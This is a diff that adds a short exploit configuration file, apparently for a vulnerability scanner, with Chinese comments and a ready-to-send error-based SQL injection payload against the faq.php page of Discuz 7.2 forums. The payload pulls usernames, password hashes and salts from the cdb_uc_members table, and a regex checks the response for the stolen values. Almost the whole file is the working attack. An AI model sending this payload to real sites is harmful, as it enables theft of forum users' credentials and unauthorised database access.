@@ -1,0 +1,8 @@
+[exploit]
+path=/dz72/faq.php?
+#测试的payload
+payload=action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%280x5E5E5E,username,0x3a,password,0x3a,salt%29%20from%20cdb_uc_members%20limit%200,1%29,floor%28rand%280%29*2%29,0x5E%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23
+#返回结果匹配的正则
+res_match=\^\w+:\w+
+#请求的方式
+method = get
